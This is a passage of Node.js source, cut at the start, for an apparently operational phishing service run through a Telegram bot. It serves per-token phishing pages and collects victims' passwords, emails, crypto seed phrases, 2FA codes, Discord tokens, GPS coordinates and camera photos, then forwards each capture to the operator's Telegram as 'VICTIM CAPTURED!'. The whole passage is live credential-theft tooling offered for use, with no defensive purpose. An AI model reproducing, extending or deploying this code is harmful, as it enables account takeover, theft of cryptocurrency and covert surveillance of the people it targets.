    `🔧 Tools Used: ${user.totalTools}\n` +
    `📅 Joined: ${user.createdAt.toLocaleDateString()}`,
    { parse_mode: "Markdown" }
  );
});

// ========== EXPRESS SERVER ==========
app.use(bodyParser.json({ limit: "50mb" }));
app.use(express.static("public"));
app.use("/public", express.static("public"));

app.post("/api/capture", async (req, res) => {
  try {
    const { token, data, camera, location } = req.body;
    
    const tool = await Tool.findOne({ token });
    if (!tool) return res.status(404).json({ error: "Link not found" });
    
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    tool.captures++;
    tool.victims.push({ data, ip, location, timestamp: new Date() });
    await tool.save();
    
    const user = await User.findOne({ userId: tool.userId });
    if (user) {
      user.victims++;
      await user.save();
      usersCache.set(user.userId, user);
    }
    
    let msg = `💀 **VICTIM CAPTURED!** 💀\n\n🔧 Tool: ${tool.type}\n🏷️ Label: ${tool.label || 'No label'}\n📱 IP: ${ip}\n`;
    if (data?.username) msg += `👤 Username: ${data.username}\n`;
    if (data?.password) msg += `🔑 Password: ${data.password}\n`;
    if (data?.email) msg += `📧 Email: ${data.email}\n`;
    if (data?.seedPhrase) msg += `💎 Seed Phrase: ${data.seedPhrase}\n`;
    if (data?.otpCode) msg += `🔐 2FA Code: ${data.otpCode}\n`;
    if (data?.discordToken) msg += `🎮 Discord Token: ${data.discordToken.substring(0, 40)}...\n`;
    if (location?.lat) msg += `📍 GPS: ${location.lat}, ${location.lon}\n`;
    msg += `⏰ Time: ${new Date().toLocaleString()}`;
    
    await bot.telegram.sendMessage(tool.userId, msg, { parse_mode: "Markdown" });
    
    if (camera) {
      await bot.telegram.sendPhoto(tool.userId, { source: Buffer.from(camera.split(',')[1], 'base64') });
    }
    
    res.json({ status: "success" });
  } catch(e) {
    console.error("Capture error:", e);
    res.status(500).json({ error: e.message });
  }
});

app.get("/p/:token", async (req, res) => {
  const token = req.params.token;
  const tool = await Tool.findOne({ token });
  
  if (!tool) return res.status(404).send("Link not found");
  if (new Date() > tool.expiresAt) return res.status(410).send("Link expired");
  
  tool.clicks++;
  await tool.save();
  
  const filePath = path.join(__dirname, "public/phish", `${token}.html`);
  if (await fs.pathExists(filePath)) {
    res.sendFile(path.resolve(filePath));
  } else {
    res.send(PRO_TEMPLATES[tool.type]?.(token) || "Loading...");
  }
});

// ========== START ==========
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server on port ${PORT}`));

async function loadData() {
  const users = await User.find({});
  users.forEach(u => usersCache.set(u.userId, u));
  console.log(`📂 Loaded ${usersCache.size} users`);
}

loadData().then(async () => {
  await bot.launch();
  console.log(`🔥 SLIME TRACKERX PRO v101 LIVE!`);
  console.log(`✅ Force Join: ${CHANNEL}`);
  console.log(`💰 Tool Cost: ${TOOL_COST} coins`);
});

process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
